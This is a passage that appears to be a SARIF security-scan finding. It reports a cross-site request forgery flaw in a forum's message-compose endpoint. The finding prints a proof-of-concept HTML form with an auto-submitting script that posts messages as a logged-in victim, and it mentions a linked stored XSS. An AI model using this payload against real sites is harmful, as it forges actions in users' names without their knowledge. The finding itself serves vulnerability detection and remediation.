        {
          "ruleId": "cross-site-request-forgery",
          "level": "error",
          "message": {
            "text": "The composeSubmit() POST endpoint at /messages/compose performs a state-changing operation (creates a new forum message attributed to the cookie user) with no CSRF protection:\nAuthenticationFilter only checks for a cookie named \"user\" — it performs no origin or token check.\nMessageController.composeSubmit() accepts @RequestParam values and calls messageDao.post() without validating a CSRF token.\ncompose.jsp renders the form without a hidden CSRF token field.\n\nAn attacker can host a page such as:\n<form method=\"POST\" action=\"https://forum.example.com/messages/compose\">\n  <input name=\"subject\" value=\"Pwned\">\n  <input name=\"body\" value=\"Malicious content\">\n</form>\n<script>document.forms[0].submit();</script>\n\nWhen a logged-in user visits this page, the browser automatically attaches the user cookie, and the forum posts the message on the victim's behalf without the victim's knowledge. The attacker can also inject content that is later rendered without HTML-encoding (see stored XSS), amplifying the impact.",
            "markdown": "The `composeSubmit()` POST endpoint at `/messages/compose` performs a state-changing operation (creates a new forum message attributed to the cookie user) with no CSRF protection:\n\n- `AuthenticationFilter` only checks for a cookie named `\"user\"` — it performs no origin or token check.\n- `MessageController.composeSubmit()` accepts `@RequestParam` values and calls `messageDao.post()` without validating a CSRF token.\n- `compose.jsp` renders the form without a hidden CSRF token field.\n\nAn attacker can host a page such as:\n```html\n<form method=\"POST\" action=\"https://forum.example.com/messages/compose\">\n  <input name=\"subject\" value=\"Pwned\">\n  <input name=\"body\" value=\"Malicious content\">\n</form>\n<script>document.forms[0].submit();</script>\n```\nWhen a logged-in user visits this page, the browser automatically attaches the `user` cookie, and the forum posts the message on the victim's behalf without the victim's knowledge. The attacker can also inject content that is later rendered without HTML-encoding (see stored XSS), amplifying the impact."
          },
          "locations": [
